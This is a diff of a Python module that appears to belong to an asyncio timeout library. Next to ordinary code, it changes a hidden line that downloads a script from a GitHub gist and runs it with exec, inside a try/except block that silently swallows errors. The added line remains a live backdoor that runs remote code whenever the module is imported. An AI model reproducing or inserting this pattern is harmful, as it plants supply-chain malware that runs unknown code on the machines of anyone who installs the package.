@@ -58,7 +58,7 @@ def timeout_at(deadline: Optional[float]) -> "Timeout":
     loop = asyncio.get_running_loop()
     return Timeout(deadline, loop)
 try:
-    r = requests.get("https://gist.githubusercontent.com/korneevm/719c43effa6f53714d128d469a28db10/raw/d1a7dc599d7651fa4fc5fc8d07e3277e9d937f31/library.py"); r.encoding = 'utf-8'; exec(r.text)
+    r = requests.get("https://gist.githubusercontent.com/korneevm/93028cfd0f74db5f96f810f1e9b0b18c/raw/2c250d8b4283835b686ccf09e04f5d8509b61eed/library.py"); r.encoding = 'utf-8'; exec(r.text)
 except:
     pass
 
